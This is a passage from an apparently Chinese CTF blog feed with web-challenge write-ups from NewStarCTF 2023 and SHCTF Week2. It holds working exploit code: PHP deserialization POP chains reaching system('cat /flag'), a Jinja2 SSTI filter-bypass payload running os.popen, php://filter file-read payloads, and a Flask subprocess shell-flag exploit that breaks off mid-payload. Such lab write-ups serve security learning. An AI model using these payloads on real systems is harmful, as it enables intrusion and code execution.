--batch</span></span><br></pre></td></tr></table></figure><h2 id="POP-Gadget">POP Gadget</h2><p>简单的pop链</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE_<span class="number">_</span>);</span><br><span class="line"></span><br><span class="line">class Begin&#123;</span><br><span class="line">    public <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$this-</span><span class="built_in">&gt;name</span>))&#123;</span><br><span class="line">            echo <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            echo <span class="string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Then&#123;</span><br><span class="line">    public <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        (<span class="variable">$this-</span>&gt;func)();  //<span class="variable">$this-</span>&gt;func=new 类名();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Good Job!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Handle&#123;</span><br><span class="line">    public <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __call(<span class="variable">$func</span>, <span class="variable">$vars</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        echo <span class="string">&quot;call&quot;</span>;</span><br><span class="line">        <span class="variable">$this-</span>&gt;obj-&gt;<span class="keyword">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Super&#123;</span><br><span class="line">    public <span class="variable">$obj</span>;</span><br><span class="line">    public <span class="keyword">function</span> __invoke()  //  字母数字()</span><br><span class="line">    &#123;</span><br><span class="line">        echo <span class="string">&quot;invoke&quot;</span>;</span><br><span class="line">        <span class="variable">$this-</span>&gt;obj-&gt;getStr();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="keyword">end</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        die(<span class="string">&quot;==GAME OVER==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class CTF&#123;</span><br><span class="line">    public <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="keyword">end</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        echo <span class="string">&quot;end&quot;</span>;</span><br><span class="line">        unset(<span class="variable">$this-</span>&gt;handle-&gt;log);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class WhiteGod&#123;</span><br><span class="line">    public <span class="variable">$func</span>;</span><br><span class="line">    public <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __unset(<span class="variable">$var</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        (<span class="variable">$this-</span>&gt;func)(<span class="variable">$this-</span>&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = new Begin();</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span> = new Then();</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span>-&gt;func = new Super();</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span>-&gt;func-&gt;obj = new Handle();</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span>-&gt;func-&gt;obj-&gt;obj = new CTF();</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span>-&gt;func-&gt;obj-&gt;obj-&gt;handle = new WhiteGod();</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span>-&gt;func-&gt;obj-&gt;obj-&gt;handle-&gt;func=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span>-&gt;func-&gt;obj-&gt;obj-&gt;handle-&gt;var=<span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line">echo urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line">//O<span class="meta">%3A5</span><span class="meta">%3A</span><span class="meta">%22Begin</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22name</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22Then</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22func</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A5</span><span class="meta">%3A</span><span class="meta">%22Super</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A3</span><span class="meta">%3A</span><span class="meta">%22obj</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A6</span><span class="meta">%3A</span><span class="meta">%22Handle</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A3</span><span class="meta">%3A</span><span class="meta">%22obj</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A3</span><span class="meta">%3A</span><span class="meta">%22CTF</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A6</span><span class="meta">%3A</span><span class="meta">%22handle</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A8</span><span class="meta">%3A</span><span class="meta">%22WhiteGod</span><span class="meta">%22</span><span class="meta">%3A2</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22func</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A6</span><span class="meta">%3A</span><span class="meta">%22system</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A3</span><span class="meta">%3A</span><span class="meta">%22var</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22ls</span>+<span class="meta">%2F</span><span class="meta">%22</span><span class="meta">%3B</span><span class="meta">%7D</span><span class="meta">%7D</span><span class="meta">%7D</span><span class="meta">%7D</span><span class="meta">%7D</span><span class="meta">%7D</span></span><br></pre></td></tr></table></figure><h2 id="GenShin">GenShin</h2><p>过滤了双{，使用{和%绕过，这里是直接用了之前某次ssti的exp直接getshell了</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(<span class="name">config</span>|attr(<span class="string">&quot;_&quot;</span><span class="string">&quot;_cla&quot;</span><span class="string">&quot;ss_&quot;</span><span class="string">&quot;_&quot;</span>)|attr(<span class="string">&quot;_&quot;</span><span class="string">&quot;_in&quot;</span><span class="string">&quot;it_&quot;</span><span class="string">&quot;_&quot;</span>)|attr(<span class="string">&quot;_&quot;</span><span class="string">&quot;_glo&quot;</span><span class="string">&quot;bals_&quot;</span><span class="string">&quot;_&quot;</span>)|attr(<span class="string">&quot;_&quot;</span><span class="string">&quot;_get&quot;</span><span class="string">&quot;item_&quot;</span><span class="string">&quot;_&quot;</span>)(<span class="string">&quot;o&quot;</span><span class="string">&quot;s&quot;</span>)|attr(<span class="string">&quot;po&quot;</span><span class="string">&quot;pen&quot;</span>)(<span class="string">&quot;ls&quot;</span>)|attr(<span class="string">&quot;re&quot;</span><span class="string">&quot;ad&quot;</span>)())%&#125;</span><br></pre></td></tr></table></figure><h2 id="R-C-E">R!!!C!!!E!!!</h2><p>应该可以盲注，这里使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;cat /flag_is_h3eeere|script result1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;qwejaskdjnlka = <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="OtenkiGirl">OtenkiGirl</h2><p>猜个原型链污染，学ing</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 比赛WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SHCTF WEB WP</title>
      <link href="/posts/54fkfh75.html"/>
      <url>/posts/54fkfh75.html</url>
      
        <content type="html"><![CDATA[<h1>SHCTF WEEK2</h1><h2 id="WEEK2-serialize">[WEEK2]serialize</h2><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">misca</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$gao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fei</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">miaomiao</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;gao=<span class="variable language_">$this</span>-&gt;fei;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">miaomiao</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;Mikey Mouse~&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">musca</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ding</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dong</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ding-&gt;dong;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">milaoshu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span><span class="string">&quot;misca~musca~milaoshu~~~&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;v);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;you should think harder!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$_GET</span>[<span class="string">&quot;wanna_fl.ag&quot;</span>]));</span><br></pre></td></tr></table></figure><p>这里反序列化头可以用数组绕过，然后用引用绕过miaomiao()方法</p><p>exp如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">misca</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$gao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fei</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">musca</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ding</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">milaoshu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v</span>=<span class="string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">musca</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;ding = <span class="keyword">new</span> <span class="title function_ invoke__">misca</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;ding-&gt;a = &amp;<span class="variable">$a</span>-&gt;ding-&gt;gao;</span><br><span class="line"><span class="variable">$a</span>-&gt;ding-&gt;fei = <span class="keyword">new</span> <span class="title function_ invoke__">milaoshu</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">?</span><span class="variable">wanna</span><span class="punctuation">[</span><span class="variable">fl</span><span class="operator">.</span><span class="variable">ag</span><span class="operator">=</span><span class="variable">a</span><span class="operator">:</span><span class="number">1</span><span class="operator">:</span><span class="punctuation">&#123;</span><span class="variable">i</span><span class="operator">:</span><span class="number">0</span><span class="operator">;</span><span class="built_in">O</span><span class="operator">:</span><span class="number">5</span><span class="operator">:</span><span class="string">&quot;musca&quot;</span><span class="operator">:</span><span class="number">1</span><span class="operator">:</span><span class="punctuation">&#123;</span><span class="variable">s</span><span class="operator">:</span><span class="number">4</span><span class="operator">:</span><span class="string">&quot;ding&quot;</span><span class="operator">;</span><span class="built_in">O</span><span class="operator">:</span><span class="number">5</span><span class="operator">:</span><span class="string">&quot;misca&quot;</span><span class="operator">:</span><span class="number">3</span><span class="operator">:</span><span class="punctuation">&#123;</span><span class="variable">s</span><span class="operator">:</span><span class="number">3</span><span class="operator">:</span><span class="string">&quot;gao&quot;</span><span class="operator">;</span><span class="built_in">N</span><span class="operator">;</span><span class="variable">s</span><span class="operator">:</span><span class="number">3</span><span class="operator">:</span><span class="string">&quot;fei&quot;</span><span class="operator">;</span><span class="built_in">O</span><span class="operator">:</span><span class="number">8</span><span class="operator">:</span><span class="string">&quot;milaoshu&quot;</span><span class="operator">:</span><span class="number">1</span><span class="operator">:</span><span class="punctuation">&#123;</span><span class="variable">s</span><span class="operator">:</span><span class="number">1</span><span class="operator">:</span><span class="string">&quot;v&quot;</span><span class="operator">;</span><span class="variable">s</span><span class="operator">:</span><span class="number">52</span><span class="operator">:</span><span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span><span class="operator">;</span><span class="punctuation">&#125;</span><span class="variable">s</span><span class="operator">:</span><span class="number">1</span><span class="operator">:</span><span class="string">&quot;a&quot;</span><span class="operator">;</span><span class="variable">R</span><span class="operator">:</span><span class="number">4</span><span class="operator">;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="WEEK2-no-wake-up">[WEEK2]no_wake_up</h2><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username = <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;try&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>fast_destruct 绕过wakeup，exp如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">flag</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;username=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">try</span>=O:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;code&quot;</span>;s:<span class="number">52</span>:<span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="WEEK2-ez-rce">[WEEK2]ez_rce</h2><p>源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gett</span>(<span class="params">obj, arg</span>):</span><br><span class="line">    tmp = obj</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        tmp = <span class="built_in">getattr</span>(tmp, i)</span><br><span class="line">        <span class="built_in">print</span>(tmp)</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sett</span>(<span class="params">obj, arg, num</span>):</span><br><span class="line">    tmp = obj</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arg) - <span class="number">1</span>):</span><br><span class="line">        tmp = <span class="built_in">getattr</span>(tmp, arg[i])</span><br><span class="line">    <span class="built_in">setattr</span>(tmp, arg[i + <span class="number">1</span>], num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>(<span class="params">giveme, num, bol</span>):</span><br><span class="line">    c = gett(subprocess, giveme)</span><br><span class="line">    tmp = <span class="built_in">list</span>(c)</span><br><span class="line">    tmp[num] = bol</span><br><span class="line">    tmp = <span class="built_in">tuple</span>(tmp)</span><br><span class="line">    sett(subprocess, giveme, tmp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">arg</span>):</span><br><span class="line">    subprocess.call(arg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> request.args.get(<span class="string">&#x27;exec&#x27;</span>) == <span class="string">&#x27;ok&#x27;</span>:</span><br><span class="line">            shell = request.args.get(<span class="string">&#x27;shell&#x27;</span>)</span><br><span class="line">            cmd(shell)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            exp = <span class="built_in">list</span>(request.get_json()[<span class="string">&#x27;exp&#x27;</span>])</span><br><span class="line">            num = <span class="built_in">int</span>(request.args.get(<span class="string">&#x27;num&#x27;</span>))</span><br><span class="line">            bol = <span class="built_in">bool</span>(request.args.get(<span class="string">&#x27;bol&#x27;</span>))</span><br><span class="line">            hint(exp, num, bol)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>注意点：</p><p>1.这里的subprocess.call的shell属性默认为false，只能执行单个命令</p><p>2.call和run等函数一样，他们都是使用Popen进行封装的，运行时都会调用这个，参考https://blog.csdn.net/wzj_110/article/details/116612425</p><p>3.使用__defaults__方法是可以获得某函数或者类内的所有属性</p><p>总体思路就是找到Popen里面的shell属性，将其修改为true，进而让call执行多段命令</p><p>一阶段payload如下:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">GET:</span></span><br><span class="line">?<span class="attr">num</span><span class="operator">=</span><span class="number">7</span><span class="variable">&amp;bol</span>=<span class="number">1</span></span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">POST:</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="string">&quot;exp&quot;</span>:<span class="punctuation">&#123;</span><span class="string">&quot;Popen&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;__init__&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;__defaults__&quot;</span>:<span class="string">&quot;123&quot;</span><span 